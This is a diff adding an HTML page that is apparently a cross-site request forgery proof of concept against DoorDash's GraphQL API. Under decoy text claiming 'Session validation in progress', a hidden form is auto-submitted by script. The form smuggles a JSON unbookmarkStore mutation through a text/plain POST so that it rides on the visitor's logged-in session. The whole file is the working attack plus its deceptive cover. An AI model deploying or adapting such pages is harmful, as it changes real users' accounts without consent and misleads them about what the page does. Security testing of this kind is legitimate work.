@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verification Page</title>
+</head>
+<body>
+    <h1>Session validation in progress...</h1>
+    <p>Please wait while we sync your preferences.</p>
+
+    <form id="unbookmarkForm" action="https://www.doordash.com/graphql/unbookmarkStore?_method=GET" method="POST" enctype="text/plain">
+        <input type="hidden" name='{"operationName":"unbookmarkStore","variables":{"storeId":"23311966"},"query":"mutation unbookmarkStore($storeId: ID!) { unbookmarkStore(storeId: $storeId) }","ignore":"' value='"}'>
+    </form>
+
+    <script>
+        // Auto-submit the form
+        document.getElementById("unbookmarkForm").submit();
+    </script>
+</body>
+</html>
